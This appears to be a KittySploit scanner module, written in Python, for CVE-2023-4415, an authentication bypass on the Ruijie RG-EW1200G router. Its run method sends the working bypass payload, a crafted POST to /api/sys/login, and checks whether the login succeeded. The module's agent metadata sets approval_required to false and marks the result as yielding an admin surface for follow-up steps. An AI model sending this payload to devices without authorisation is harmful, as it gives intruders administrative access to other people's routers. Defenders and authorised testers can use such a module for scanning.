#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability was found in Ruijie RG-EW1200G 07161417 r483."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ruijie RG-EW1200G Router Background - Login Bypass Detection',
        'description': 'A vulnerability was found in Ruijie RG-EW1200G 07161417 r483. It has been rated as critical. Affected by this issue is some unknown functionality of the file /api/sys/login. The manipulation leads to improper authentication. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. VDB-237518 is the identifier assigned to this vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'ruijie', 'router', 'ruijienetworks', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-4415',
            'https://github.com/blakespire/repoforcve/tree/main/RG-EW1200G-logic',
            'https://vuldb.com/?ctiid.237518',
            'https://vuldb.com/?id.237518',
            'https://github.com/thedarknessdied/Ruijie_RG-EW1200G_login_bypass-CVE-2023-4415',
        ],
        'cve': 'CVE-2023-4415',
    }

    def run(self):
        path = '/api/sys/login'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='{\n  "username":"2",\n  "password":"admin",\n  "timestamp":1695218596000\n}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"result":"ok"', '"msg":"登入成功"',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason='Ruijie RG-EW1200G Router Background - Login Bypass detected',
                path=path,
            )
            return True
        return False

